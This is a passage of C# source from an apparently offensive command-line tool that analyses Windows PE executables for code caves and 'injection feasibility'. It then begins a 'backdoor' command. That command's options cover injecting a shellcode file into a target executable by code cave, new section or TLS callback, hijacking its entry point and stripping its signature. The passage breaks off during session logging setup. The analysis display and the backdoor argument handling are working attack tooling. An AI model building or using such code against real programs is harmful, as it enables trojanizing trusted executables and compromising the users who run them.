                $"[{UiColors.Accent}]Subsystem:[/]     [{UiColors.Value}]{Markup.Escape(result.OptionalHeader?.SubsystemString ?? "N/A")}[/]",
                $"[{UiColors.Accent}]Compiled:[/]      [{UiColors.Value}]{Markup.Escape(result.CompileTimeFormatted ?? "N/A")}[/]",
                $"[{UiColors.Accent}]Linker:[/]        [{UiColors.Value}]{Markup.Escape(result.OptionalHeader?.LinkerVersion ?? "N/A")}[/]",
                $"[{UiColors.Accent}].NET:[/]          {(result.IsDotNet ? $"[{UiColors.Warning}]Yes[/]" : $"[{UiColors.Value}]No[/]")}",
            };

            var overviewPanel = new Panel(new Markup(string.Join("\n", overviewLines)))
                .Header($"[bold {UiColors.Header}]File Overview[/]")
                .Border(BoxBorder.Rounded)
                .BorderColor(UiColors.BoxBorderColor)
                .Expand();

            // Security panel
            var secContent = new List<string>();
            if (result.Security != null)
            {
                var sec = result.Security;
                string scoreColor = sec.SecurityScore < 40 ? "red1" : sec.SecurityScore < 70 ? "gold1" : "green3_1";
                string scoreBar = BuildUsageBar(sec.SecurityScore);
                secContent.Add($"[{UiColors.Accent}]Score:[/] {scoreBar} [{scoreColor}]{sec.SecurityScore}/100[/]");
                if (!string.IsNullOrEmpty(sec.SecurityAssessment))
                    secContent.Add($"[{UiColors.Accent}]Assessment:[/] [{scoreColor}]{Markup.Escape(sec.SecurityAssessment)}[/]");
                secContent.Add("");

                static string FlagL(bool on, string name)
                {
                    string padded = name.PadRight(16);
                    return on ? $"[green3_1]\u2713[/] {padded}" : $"[red1]\u2717[/] [grey63]{padded}[/]";
                }
                static string FlagR(bool on, string name)
                {
                    return on ? $"[green3_1]\u2713[/] {name}" : $"[red1]\u2717[/] [grey63]{name}[/]";
                }

                secContent.Add($"{FlagL(sec.HasAslr, "ASLR")}{FlagR(sec.HasDep, "DEP/NX")}");
                secContent.Add($"{FlagL(sec.HasHighEntropyVa, "High Entropy")}{FlagR(sec.HasCfg, "CFG")}");
                secContent.Add($"{FlagL(sec.HasSeh, "SEH")}{FlagR(sec.HasSafeSeh, "SafeSEH")}");
                secContent.Add($"{FlagL(sec.HasRfg, "RFG")}{FlagR(sec.HasAuthenticode, "Authenticode")}");
            }
            else
            {
                secContent.Add("[grey63]No security data available[/]");
            }

            var securityPanel = new Panel(new Markup(string.Join("\n", secContent)))
                .Header($"[bold {UiColors.Header}]Security[/]")
                .Border(BoxBorder.Rounded)
                .BorderColor(UiColors.BoxBorderColor)
                .Expand();

            AnsiConsole.Write(new Columns(overviewPanel, securityPanel));
            AnsiConsole.WriteLine();

            // ══════════════════════════════════════════════════════════
            //  PE HEADERS
            // ══════════════════════════════════════════════════════════
            {
                var headerLines = new List<string>();

                if (result.OptionalHeader != null)
                {
                    var oh = result.OptionalHeader;
                    headerLines.Add(
                        $"[{UiColors.Accent}]Entry Point:[/] [mediumpurple1]0x{oh.AddressOfEntryPoint:X8}[/]    " +
                        $"[{UiColors.Accent}]Image Base:[/] [mediumpurple1]0x{oh.ImageBase:X}[/]    " +
                        $"[{UiColors.Accent}]Checksum:[/] [mediumpurple1]0x{oh.Checksum:X8}[/]");
                    headerLines.Add(
                        $"[{UiColors.Accent}]Section Align:[/] [mediumpurple1]0x{oh.SectionAlignment:X}[/]    " +
                        $"[{UiColors.Accent}]File Align:[/] [mediumpurple1]0x{oh.FileAlignment:X}[/]    " +
                        $"[{UiColors.Accent}]Size of Image:[/] [mediumpurple1]0x{oh.SizeOfImage:X}[/]");

                    if (oh.DllCharacteristicsList.Count > 0)
                        headerLines.Add($"[{UiColors.Accent}]DLL Chars:[/] [grey63]{Markup.Escape(string.Join(", ", oh.DllCharacteristicsList))}[/]");
                }

                if (result.FileHeader != null)
                {
                    headerLines.Add(
                        $"[{UiColors.Accent}]Machine:[/] [white]{Markup.Escape(result.FileHeader.MachineString)}[/]    " +
                        $"[{UiColors.Accent}]Timestamp:[/] [white]{result.FileHeader.TimeDateStampUtc:yyyy-MM-dd HH:mm:ss} UTC[/]");

                    if (result.FileHeader.CharacteristicsList.Count > 0)
                        headerLines.Add($"[{UiColors.Accent}]Characteristics:[/] [grey63]{Markup.Escape(string.Join(", ", result.FileHeader.CharacteristicsList))}[/]");
                }

                if (headerLines.Count > 0)
                {
                    AnsiConsole.Write(new Panel(new Markup(string.Join("\n", headerLines)))
                        .Header("[bold dodgerblue2]PE Headers[/]")
                        .Border(BoxBorder.Rounded)
                        .BorderColor(UiColors.BoxBorderColor)
                        .Expand());
                    AnsiConsole.WriteLine();
                }
            }

            // ══════════════════════════════════════════════════════════
            //  SECTIONS TABLE
            // ══════════════════════════════════════════════════════════
            {
                var sectionTable = new Table()
                    .Border(TableBorder.Simple)
                    .BorderColor(UiColors.BoxBorderColor)
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Section[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]VirtAddr[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]VirtSize[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]RawAddr[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]RawSize[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Perms[/]").Centered())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Entropy[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Bar[/]").LeftAligned());

                foreach (var sec in result.Sections)
                {
                    string entropyColor = sec.Entropy < 6.0 ? "green3_1" : sec.Entropy < 7.0 ? "gold1" : "red1";
                    string nameColor = sec.IsExecutable ? "red1" : "white";
                    string entropyBar = BuildEntropyBar(sec.Entropy);

                    sectionTable.AddRow(
                        $"[{nameColor}]{Markup.Escape(sec.Name)}[/]",
                        $"[mediumpurple1]0x{sec.VirtualAddress:X8}[/]",
                        $"[mediumpurple1]0x{sec.VirtualSize:X8}[/]",
                        $"[mediumpurple1]0x{sec.RawAddress:X8}[/]",
                        $"[mediumpurple1]0x{sec.RawSize:X8}[/]",
                        Markup.Escape(sec.PermissionsString),
                        $"[{entropyColor}]{sec.Entropy:F2}[/]",
                        entropyBar
                    );
                }

                AnsiConsole.Write(new Panel(sectionTable)
                    .Header("[bold dodgerblue2]Sections[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  SECURITY ASSESSMENT (detailed)
            // ══════════════════════════════════════════════════════════
            if (result.Security != null)
            {
                var secDetail = result.Security;

                var protTable = new Table()
                    .Border(TableBorder.Simple)
                    .BorderColor(UiColors.BoxBorderColor)
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Protection[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Status[/]").Centered())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Protection[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Status[/]").Centered());

                var allFlags = new List<(string name, bool enabled)>
                {
                    ("ASLR", secDetail.HasAslr),
                    ("DEP / NX", secDetail.HasDep),
                    ("CFG (Control Flow Guard)", secDetail.HasCfg),
                    ("High Entropy VA", secDetail.HasHighEntropyVa),
                    ("SEH", secDetail.HasSeh),
                    ("SafeSEH", secDetail.HasSafeSeh),
                    ("RFG", secDetail.HasRfg),
                    ("Force Integrity", secDetail.ForceIntegrity),
                    ("NX Compat", secDetail.NxCompat),
                    ("Authenticode", secDetail.HasAuthenticode),
                    ("AppContainer", secDetail.AppContainer),
                    ("Terminal Server Aware", secDetail.TerminalServerAware),
                };

                for (int fi = 0; fi < allFlags.Count; fi += 2)
                {
                    var left = allFlags[fi];
                    string leftIcon = left.enabled ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]";

                    if (fi + 1 < allFlags.Count)
                    {
                        var right = allFlags[fi + 1];
                        string rightIcon = right.enabled ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]";
                        protTable.AddRow(
                            $"[white]{Markup.Escape(left.name)}[/]", leftIcon,
                            $"[white]{Markup.Escape(right.name)}[/]", rightIcon);
                    }
                    else
                    {
                        protTable.AddRow(
                            $"[white]{Markup.Escape(left.name)}[/]", leftIcon,
                            "", "");
                    }
                }

                AnsiConsole.Write(new Panel(protTable)
                    .Header("[bold dodgerblue2]Security Assessment[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  IMPORTS
            // ══════════════════════════════════════════════════════════
            if (result.Imports.Count > 0)
            {
                int totalFuncs = result.TotalImports;

                var importTable = new Table()
                    .Border(TableBorder.Simple)
                    .BorderColor(UiColors.BoxBorderColor)
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]DLL[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Functions[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Delay[/]").Centered())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]DLL[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Functions[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Delay[/]").Centered());

                var importList = result.Imports.Take(20).ToList();
                for (int ii = 0; ii < importList.Count; ii += 2)
                {
                    var left = importList[ii];
                    string leftDelay = left.IsDelayLoaded ? "[gold1]Yes[/]" : "[grey63]No[/]";

                    if (ii + 1 < importList.Count)
                    {
                        var right = importList[ii + 1];
                        string rightDelay = right.IsDelayLoaded ? "[gold1]Yes[/]" : "[grey63]No[/]";
                        importTable.AddRow(
                            $"[white]{Markup.Escape(left.Name)}[/]", $"[white]{left.Functions.Count}[/]", leftDelay,
                            $"[white]{Markup.Escape(right.Name)}[/]", $"[white]{right.Functions.Count}[/]", rightDelay);
                    }
                    else
                    {
                        importTable.AddRow(
                            $"[white]{Markup.Escape(left.Name)}[/]", $"[white]{left.Functions.Count}[/]", leftDelay,
                            "", "", "");
                    }
                }

                var importContent = new List<IRenderable> { importTable };

                if (result.Imports.Count > 20)
                    importContent.Add(new Markup($"[grey63]... and {result.Imports.Count - 20} more DLLs[/]"));

                // Suspicious imports
                var suspicious = result.Imports
                    .SelectMany(d => d.Functions.Where(f => f.IsSuspicious)
                        .Select(f => new { Dll = d.Name, f.Name, f.SuspiciousReason }))
                    .ToList();

                if (suspicious.Count > 0)
                {
                    importContent.Add(new Text(""));
                    importContent.Add(new Markup($"[red1]\u26a0 Suspicious Imports ({suspicious.Count}):[/]"));

                    var suspTable = new Table()
                        .Border(TableBorder.Simple)
                        .BorderColor(Color.Red)
                        .AddColumn(new TableColumn("[red1]DLL[/]").LeftAligned())
                        .AddColumn(new TableColumn("[red1]Function[/]").LeftAligned())
                        .AddColumn(new TableColumn("[red1]Reason[/]").LeftAligned());

                    foreach (var s in suspicious)
                    {
                        suspTable.AddRow(
                            $"[gold1]{Markup.Escape(s.Dll)}[/]",
                            $"[red1]{Markup.Escape(s.Name)}[/]",
                            $"[grey63]{Markup.Escape(s.SuspiciousReason)}[/]"
                        );
                    }

                    importContent.Add(suspTable);
                }

                var importRows = new Rows(importContent);
                AnsiConsole.Write(new Panel(importRows)
                    .Header($"[bold dodgerblue2]Imports ({result.Imports.Count} DLLs, {totalFuncs} functions)[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  EXPORTS
            // ══════════════════════════════════════════════════════════
            if (result.TotalExports > 0)
            {
                var exportTable = new Table()
                    .Border(TableBorder.Simple)
                    .BorderColor(UiColors.BoxBorderColor)
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Name[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Ordinal[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]RVA[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Forwarded[/]").LeftAligned());

                foreach (var exp in result.Exports)
                {
                    exportTable.AddRow(
                        $"[white]{Markup.Escape(exp.Name)}[/]",
                        $"[white]{exp.Ordinal}[/]",
                        $"[mediumpurple1]0x{exp.Rva:X8}[/]",
                        exp.IsForwarded
                            ? $"[gold1]{Markup.Escape(exp.ForwardedTo)}[/]"
                            : "[grey63]No[/]"
                    );
                }

                AnsiConsole.Write(new Panel(exportTable)
                    .Header($"[bold dodgerblue2]Exports ({result.TotalExports})[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  RESOURCES
            // ══════════════════════════════════════════════════════════
            if (result.Resources?.Count > 0)
            {
                var resContent = new List<IRenderable>();

                var resFlags = new List<string>();
                if (result.HasManifest) resFlags.Add("[green3_1]\u2713 Manifest[/]");
                if (result.HasIcon) resFlags.Add("[green3_1]\u2713 Icon[/]");
                if (result.HasVersionInfo) resFlags.Add("[green3_1]\u2713 VersionInfo[/]");
                if (resFlags.Count > 0)
                    resContent.Add(new Markup(string.Join("  ", resFlags)));

                var resTable = new Table()
                    .Border(TableBorder.Simple)
                    .BorderColor(UiColors.BoxBorderColor)
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Type[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Name[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Size[/]").RightAligned());

                foreach (var res in result.Resources)
                {
                    resTable.AddRow(
                        $"[white]{Markup.Escape(res.Type)}[/]",
                        $"[white]{Markup.Escape(res.Name)}[/]",
                        $"[white]{res.Size:N0}[/]"
                    );
                }

                resContent.Add(resTable);

                AnsiConsole.Write(new Panel(new Rows(resContent))
                    .Header($"[bold dodgerblue2]Resources ({result.Resources.Count})[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  TLS
            // ══════════════════════════════════════════════════════════
            if (result.Tls != null)
            {
                var tlsLines = new List<string>();
                tlsLines.Add($"[{UiColors.Accent}]Callbacks:[/] [white]{result.Tls.NumberOfCallbacks}[/]");

                if (result.Tls.CallbackAddresses.Count > 0)
                {
                    foreach (var addr in result.Tls.CallbackAddresses)
                        tlsLines.Add($"  [mediumpurple1]0x{addr:X}[/]");
                }

                AnsiConsole.Write(new Panel(new Markup(string.Join("\n", tlsLines)))
                    .Header("[bold dodgerblue2]TLS (Thread Local Storage)[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  CODE CAVES
            // ══════════════════════════════════════════════════════════
            {
                var caveContent = new List<IRenderable>();

                if (result.TotalCodeCaves > 0)
                {
                    caveContent.Add(new Markup($"[{UiColors.Accent}]Largest:[/] [white]{result.LargestCodeCave:N0} bytes[/]"));

                    var caveTable = new Table()
                        .Border(TableBorder.Simple)
                        .BorderColor(UiColors.BoxBorderColor)
                        .AddColumn($"[{UiColors.Accent}]Section[/]")
                        .AddColumn($"[{UiColors.Accent}]Offset[/]")
                        .AddColumn($"[{UiColors.Accent}]RVA[/]")
                        .AddColumn($"[{UiColors.Accent}]Size[/]")
                        .AddColumn($"[{UiColors.Accent}]Injectable[/]");

                    foreach (var cave in result.CodeCaves.Take(10))
                    {
                        var injectIcon = cave.SuitableForInjection ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]";
                        caveTable.AddRow(
                            Markup.Escape(cave.SectionName),
                            $"[mediumpurple1]0x{cave.FileOffset:X8}[/]",
                            $"[mediumpurple1]0x{cave.VirtualAddress:X8}[/]",
                            $"[white]{cave.Size:N0} B[/]",
                            injectIcon
                        );
                    }

                    caveContent.Add(caveTable);

                    if (result.TotalCodeCaves > 10)
                        caveContent.Add(new Markup($"[grey63]... and {result.TotalCodeCaves - 10} more caves[/]"));
                }
                else
                {
                    caveContent.Add(new Markup("[grey63]No code caves found[/]"));
                }

                AnsiConsole.Write(new Panel(new Rows(caveContent))
                    .Header($"[bold dodgerblue2]Code Caves ({result.TotalCodeCaves} found, {result.TotalCodeCaveSpace:N0} bytes total)[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  PACKING / ENTROPY
            // ══════════════════════════════════════════════════════════
            {
                string overallEntropyColor = result.OverallEntropy < 6.0 ? "green3_1" : result.OverallEntropy < 7.0 ? "gold1" : "red1";
                var entropyLines = new List<string>();
                entropyLines.Add($"[{UiColors.Accent}]Overall Entropy:[/]  [{overallEntropyColor}]{result.OverallEntropy:F4}[/]  {BuildEntropyBar(result.OverallEntropy, 15)}");
                entropyLines.Add($"[{UiColors.Accent}]Possibly Packed:[/]  {(result.IsPossiblyPacked ? "[red1]Yes[/]" : "[green3_1]No[/]")}");

                if (!string.IsNullOrEmpty(result.PackerDetection))
                    entropyLines.Add($"[{UiColors.Accent}]Packer Detected:[/]  [gold1]{Markup.Escape(result.PackerDetection)}[/]");

                AnsiConsole.Write(new Panel(new Markup(string.Join("\n", entropyLines)))
                    .Header("[bold dodgerblue2]Packing / Entropy[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  INJECTION FEASIBILITY
            // ══════════════════════════════════════════════════════════
            if (result.Feasibility != null)
            {
                var feas = result.Feasibility;

                var feasLines = new List<string>();

                void AddFeasMethod(string icon, string name, MethodFeasibility m)
                {
                    string statusColor = m.Status switch
                    {
                        "Available" => "green3_1",
                        "Limited" => "gold1",
                        _ => "red1"
                    };
                    string space = m.AvailableSpace > 0 ? $"  [white]{m.AvailableSpace:N0} B[/]" : "";
                    feasLines.Add($"  {icon} [white]{name.PadRight(18)}[/] [{statusColor}]{Markup.Escape(m.Status).PadRight(12)}[/]{space}");
                }

                AddFeasMethod(feas.CodeCave.IsFeasible ? "[green3_1]\u2605[/]" : "[grey63]\u25cb[/]", "Code Cave", feas.CodeCave);
                AddFeasMethod(feas.NewSection.IsFeasible ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]", "New Section", feas.NewSection);
                AddFeasMethod(feas.SectionExtension.IsFeasible ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]", "Section Extension", feas.SectionExtension);
                AddFeasMethod(feas.TlsCallback.IsFeasible ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]", "TLS Callback", feas.TlsCallback);
                AddFeasMethod(feas.EntryPointHijack.IsFeasible ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]", "EP Hijack", feas.EntryPointHijack);

                if (!string.IsNullOrEmpty(feas.RecommendedMethod))
                {
                    feasLines.Add("");
                    feasLines.Add($"  [{UiColors.Accent}]Recommended:[/] [green3_1]{Markup.Escape(feas.RecommendedMethod)}[/]");
                }

                AnsiConsole.Write(new Panel(new Markup(string.Join("\n", feasLines)))
                    .Header("[bold dodgerblue2]Injection Feasibility[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(Color.Cyan1)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  SECTION MEMORY MAP
            // ══════════════════════════════════════════════════════════
            if (result.Sections.Count > 0)
            {
                var mapLines = new List<string>();
                long totalVirt = result.Sections.Sum(s => (long)s.VirtualSize);
                int mapBarWidth = 40;

                foreach (var s in result.Sections)
                {
                    double pct = totalVirt > 0 ? (double)s.VirtualSize / totalVirt * 100.0 : 0;
                    int filled = (int)Math.Round(pct / 100.0 * mapBarWidth);
                    filled = Math.Clamp(filled, 1, mapBarWidth);
                    string barColor = s.IsExecutable ? "red1" : s.IsWritable ? "gold1" : UiColors.Accent;
                    string bar = $"[{barColor}]{new string('\u2588', filled)}[/][grey23]{new string('\u2591', mapBarWidth - filled)}[/]";

                    string sizeStr = s.VirtualSize >= 1048576
                        ? $"{s.VirtualSize / 1048576.0:F1} MB"
                        : s.VirtualSize >= 1024
                        ? $"{s.VirtualSize / 1024.0:F0} KB"
                        : $"{s.VirtualSize} B";

                    mapLines.Add(
                        $"[white]{Markup.Escape(s.Name).PadRight(8)}[/]  {bar}  [white]{sizeStr,8}[/]  [grey63]{Markup.Escape(s.PermissionsString)}[/]  [grey63]{pct:F1}%[/]");
                }

                AnsiConsole.Write(new Panel(new Markup(string.Join("\n", mapLines)))
                    .Header("[bold dodgerblue2]Section Memory Map[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  VIRTUAL ADDRESS SPACE
            // ══════════════════════════════════════════════════════════
            if (result.Sections.Count > 0 && result.OptionalHeader != null)
            {
                var vaLines = new List<string>();
                long totalImage = result.OptionalHeader.SizeOfImage;
                int vaBarWidth = 30;

                // PE Headers
                if (result.Sections.Count > 0)
                {
                    uint headerEnd = result.Sections[0].VirtualAddress;
                    vaLines.Add($"[mediumpurple1]0x{0:X8}[/] [grey63]\u252c\u2500\u2500[/] [dodgerblue2]PE Headers[/] [grey63]({headerEnd:N0} B)[/]");
                }

                for (int si = 0; si < result.Sections.Count; si++)
                {
                    var s = result.Sections[si];
                    double pct = totalImage > 0 ? (double)s.VirtualSize / totalImage * 100.0 : 0;
                    int filled = (int)Math.Round(pct / 100.0 * vaBarWidth);
                    filled = Math.Clamp(filled, 1, vaBarWidth);
                    string barColor = s.IsExecutable ? "red1" : s.IsWritable ? "gold1" : UiColors.Accent;
                    string bar = $"[{barColor}]{new string('\u2588', filled)}[/]";
                    string connector = si < result.Sections.Count - 1 ? "\u251c\u2500\u2500" : "\u2514\u2500\u2500";

                    string sizeStr = s.VirtualSize >= 1048576
                        ? $"{s.VirtualSize / 1048576.0:F1} MB"
                        : s.VirtualSize >= 1024
                        ? $"{s.VirtualSize / 1024.0:F0} KB"
                        : $"{s.VirtualSize} B";

                    vaLines.Add(
                        $"[mediumpurple1]0x{s.VirtualAddress:X8}[/] [grey63]{connector}[/] {bar} [white]{Markup.Escape(s.Name)}[/] [grey63]{Markup.Escape(s.PermissionsString)}  {sizeStr}[/]");
                }

                AnsiConsole.Write(new Panel(new Markup(string.Join("\n", vaLines)))
                    .Header("[bold dodgerblue2]Virtual Address Space[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }


            return 0;
        }
        catch (Exception ex)
        {
            logger.Error($"Analysis failed: {ex.Message}");
            return 1;
        }
    }

    /// <summary>Build a Spectre markup usage bar.</summary>
    private static string BuildUsageBar(double pct, int width = 20)
    {
        int filled = (int)Math.Round(pct / 100.0 * width);
        filled = Math.Clamp(filled, 0, width);
        return $"[{UiColors.Accent}]{new string('\u2588', filled)}[/][grey23]{new string('\u2591', width - filled)}[/]";
    }

    /// <summary>Build a colored entropy bar (green &lt; 6, gold &lt; 7, red &gt;= 7).</summary>
    private static string BuildEntropyBar(double entropy, int width = 20)
    {
        double pct = entropy / 8.0 * 100.0;
        int filled = (int)Math.Round(pct / 100.0 * width);
        filled = Math.Clamp(filled, 0, width);
        string color = entropy < 6.0 ? "green3_1" : entropy < 7.0 ? "gold1" : "red1";
        return $"[{color}]{new string('\u2588', filled)}[/][grey23]{new string('\u2591', width - filled)}[/]";
    }


    // ═══════════════════════════════════════════════════════════════════════
    //  backdoor
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunBackdoorAsync(string[] args)
    {
        if (args.Length == 0)
            return await RunSubMode("backdoor", RunBackdoorAsync, PrintBackdoorUsage);

        string? peFile = null;
        string? shellcodeFile = null;
        string? outputFile = null;
        string method = "code-cave";
        string encryption = "none";
        string carrier = "entry-point";
        byte xorKey = 0x42;
        string sectionName = ".extra";
        bool removeSig = true;
        bool patchSubsystem = true;
        bool preserveEntry = true;
        bool patchIat = true;
        bool patchExitCalls = true;
        bool dryRun = false;
        bool verbose = false;
        bool jsonOutput = false;
        int minCaveSize = 0;
        bool? sessionLogOverride = null; // null = use AppSettings, true/false = CLI override

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "--pe" when i + 1 < args.Length:
                    peFile = args[++i]; break;
                case "--shellcode" or "-s" when i + 1 < args.Length:
                    shellcodeFile = args[++i]; break;
                case "--output" or "-o" when i + 1 < args.Length:
                    outputFile = args[++i]; break;
                case "--method" or "-m" when i + 1 < args.Length:
                    method = args[++i].ToLowerInvariant(); break;
                case "--encryption" or "--enc" when i + 1 < args.Length:
                    encryption = args[++i].ToLowerInvariant(); break;
                case "--xor-key" when i + 1 < args.Length:
                    var keyStr = args[++i];
                    xorKey = keyStr.StartsWith("0x", StringComparison.OrdinalIgnoreCase)
                        ? Convert.ToByte(keyStr, 16)
                        : byte.Parse(keyStr);
                    break;
                case "--section-name" when i + 1 < args.Length:
                    sectionName = args[++i]; break;
                case "--no-remove-sig":
                    removeSig = false; break;
                case "--no-patch-subsystem":
                    patchSubsystem = false; break;
                case "--carrier" or "--invoke" when i + 1 < args.Length:
                    carrier = args[++i].ToLowerInvariant(); break;
                case "--no-preserve-entry":
                    preserveEntry = false; break;
                case "--no-patch-iat":
                    patchIat = false; break;
                case "--no-patch-exit":
                    patchExitCalls = false; break;
                case "--cave-min-size" when i + 1 < args.Length:
                    minCaveSize = int.Parse(args[++i]); break;
                case "--dry-run":
                    dryRun = true; break;
                case "--verbose":
                    verbose = true; break;
                case "--json":
                    jsonOutput = true; break;
                case "--no-session-log":
                    sessionLogOverride = false; break;
                case "--session-log":
                    sessionLogOverride = true; break;
                default:
                    if (args[i].StartsWith("-"))
                    {
                        AnsiConsole.MarkupLine($"[red]Error:[/] Unknown option: {Markup.Escape(args[i])}");
                        PrintBackdoorUsage();
                        return 1;
                    }
                    break;
            }
        }

        if (peFile == null || shellcodeFile == null)
        {
            PrintBackdoorUsage();
            return 1;
        }

        if (!File.Exists(peFile))
        {
            AnsiConsole.MarkupLine($"[red]Error:[/] Target PE not found: {Markup.Escape(peFile)}");
            return 1;
        }
        if (!File.Exists(shellcodeFile))
        {
            AnsiConsole.MarkupLine($"[red]Error:[/] Shellcode file not found: {Markup.Escape(shellcodeFile)}");
            return 1;
        }

        var injectionMethod = method switch
        {
            "code-cave" or "codecave" or "cave" => InjectionMethod.CodeCave,
            "new-section" or "newsection" or "section" => InjectionMethod.NewSection,
            "section-ext" or "sectionext" or "extend" => InjectionMethod.SectionExtension,
            "text-pad" or "textpad" or "padding" => InjectionMethod.TextSectionPadding,
            "tls-callback" or "tls" or "tlscallback" => InjectionMethod.TlsCallback,
            _ => InjectionMethod.CodeCave
        };

        var encryptionMethod = encryption switch
        {
            "xor" => PayloadEncryption.Xor,
            "xor2" => PayloadEncryption.Xor2,
            "rc4" => PayloadEncryption.Rc4,
            _ => PayloadEncryption.None
        };

        var carrierInvoke = carrier switch
        {
            "entry-point" or "entrypoint" or "hijack" => CarrierInvoke.EntryPointHijack,
            "function-backdoor" or "function" => CarrierInvoke.EntryFunctionBackdoor,
            "tls" or "tls-callback" => CarrierInvoke.TlsCallback,
            _ => CarrierInvoke.EntryPointHijack
        };

        if (encryptionMethod != PayloadEncryption.None)
        {
            AnsiConsole.MarkupLine("[red]Error:[/] The backdoor command does not perform in-place encryption or encoding.");
            AnsiConsole.MarkupLine("[grey]Prepare a compatible flat .bin first, then inject it with [white]--encryption none[/].[/]");
            return 1;
        }

        if (carrierInvoke != CarrierInvoke.EntryPointHijack)
        {
            AnsiConsole.MarkupLine($"[red]Error:[/] Carrier [white]{Markup.Escape(carrier)}[/] is not implemented for the backdoor command.");
            AnsiConsole.MarkupLine("[grey]Supported carrier: [white]entry-point[/].[/]");
            return 1;
        }

        if (!preserveEntry)
        {
            AnsiConsole.MarkupLine("[red]Error:[/] [white]--no-preserve-entry[/] is not implemented.");
            AnsiConsole.MarkupLine("[grey]The current carrier always resumes the original entry point after launching the payload.[/]");
            return 1;
        }

        var consoleLogger = new ConsoleLogger();
        if (verbose) consoleLogger.VerboseEnabled = true;
        if (jsonOutput) consoleLogger.SuppressOutput = true;
        var paths = new AppPaths();

        // ── Load settings & decide session logging ───────────────
        var appSettings = AppSettingsService.Load();
        bool sessionLoggingEnabled = sessionLogOverride ?? appSettings.SessionLoggingEnabled;

        string? sessionDir = null;
        TeeLogger? teeLogger = null;
        IAppLogger logger = consoleLogger;

        if (sessionLoggingEnabled)
        {
            sessionDir = paths.CreateBackdoorSessionDirectory();
            string sessionLogPath = Path.Combine(sessionDir, "backdoor_log.txt");
            teeLogger = new TeeLogger(consoleLogger, sessionLogPath);
            logger = teeLogger;

            // Log session header
            teeLogger?.FileOnly("════════════════════════════════════════════════════════════");
            teeLogger?.FileOnly("  Washmachine PE Backdoor – Session Log");
            teeLogger?.FileOnly($"  Session dir : {sessionDir}");
            teeLogger?.FileOnly($"  Started     : {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            teeLogger?.FileOnly("════════════════════════════════════════════════════════════");
            teeLogger?.FileOnly("");
            teeLogger?.FileOnly("── Command-line arguments ─────────────────────────────────");
            teeLogger?.FileOnly($"  --pe            : {peFile}");
            teeLogger?.FileOnly($"  --shellcode     : {shellcodeFile}");
            teeLogger?.FileOnly($"  --output        : {outputFile ?? "(default)"}");
